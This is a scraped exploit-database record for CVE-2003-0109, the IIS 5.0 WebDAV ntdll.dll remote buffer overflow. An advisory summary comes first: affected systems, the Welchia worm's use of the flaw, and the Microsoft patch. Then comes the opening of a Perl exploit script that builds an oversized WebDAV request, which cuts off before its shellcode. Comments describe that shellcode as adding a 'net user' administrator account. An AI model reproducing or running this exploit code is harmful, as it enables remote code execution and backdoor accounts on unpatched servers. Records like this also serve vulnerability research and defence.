    "text": "ecve : CVE-2003-0109 ， title : Microsoft IIS 5.0 ( Windows XP/2000/NT 4.0 ) - WebDAV 'ntdll.dll' Remote Buffer Overflow ( 1 ) - Windows remote Exploit ， verified : Verified ， exploit_detail : E-DB Note : Updated Exploit ~  ， source :  ， The Windows library ntdll.dll includes a function that does not perform sufficient bounds checking. The vulnerability is present in the function \"RtlDosPathNameToNtPathName_U\" and may be exploited through other programs that use the library if an attack vector permits it. One of these programs is the implementation of WebDAV that ships with IIS 5.0. The vector allows for the vulnerability in ntdll.dll to be exploited by a remote attacker. ， Several other library functions which call the vulnerable ntdll.dll procedure have been identified. Administrators are advised to patch as other attack vectors are likely to surface. ， Microsoft has revised its advisory to state that this vulnerability affects Windows NT systems. As Windows NT does not support WebDAV , exploits using WebDAV as the attack vector will not be effective against Windows NT systems. Windows XP does not also include WebDAV by default , but other attack vectors may be possible , especially in cases where the attacker has interactive access to the system. WebDAV may be installed by a user on Windows XP with IIS 5.1 , so WebDAV may be a possible means of exploitation in these circumstances. ， Reports suggest that numerous hosts have been scanned in an attempt to exploit this vulnerability. Although unconfirmed , this may be the result of a system of automated attacks. ， It has been reported that this vulnerability is also present in the \"RtlGetFullPathName_U\" function. The supplied Microsoft patch ( Q815021 ) also corrects this function. ， It has been reported that the W32.Welchia.Worm , described in MCID 1811 , is actively exploiting this vulnerability. ，  #  ! /bin/perl ，  # 2003.3.24 ，  # mat @ monkey.org ，  # mat @ panicsecurity.org ，  # tested on Windows 2000 Advanced Server SP3 : Korean language edition ，  # ntdll.dll with 2002.7.3 version ，  # You need to change some parameters to make this exploit work on your platform of choice ，  # This exploit uses unicode decoder scheme and self-modifies unicoded shellcode to original one. ， use Socket ;  ， die \"usage : wd.pl <target hostname>\\n\" ;  ， my $ host= $ ARGV [ 0 ]  ;  ， my $ url_len=65514 ;  ，  # LOCK : 65514 ，  # SEARCH : 65535 ， my $ host_header=\"Host :  $ host\\r\\n\" ;  ， my $ translate_f=\"Translate : f\\r\\n\" ;  ，  $ translate_f=\"\" ;  ， my $ port=80 ;  ， my $ depth=\"Depth : 1\\r\\n\" ;  ，  $ depth=\"\" ;  ， my $ connection_str=\"Connection : Close\\r\\n\" ;  ，  $ connection_str=\"\" ;  ， my $ url2=\"B\" ;  ，  $ url2=\"\" ;  ， my $ cont=\"C\" ;  ， my $ lock_token=\"Lock-Token :  $ cont\\r\\n\" ;  ，  $ lock_token=\"\" ;  ， my $ destination=\"Destination : / $ url2\\r\\n\" ;  ，  $ destination=\"\" ;  ，  # LoadLibrary : 0x100107c ;  ，  # GetProcAddress 0x1001034 ;  ，  # WinExec ( \"net user matt 1234 /ADD\" )  ，  # this shellcode is encoded to",
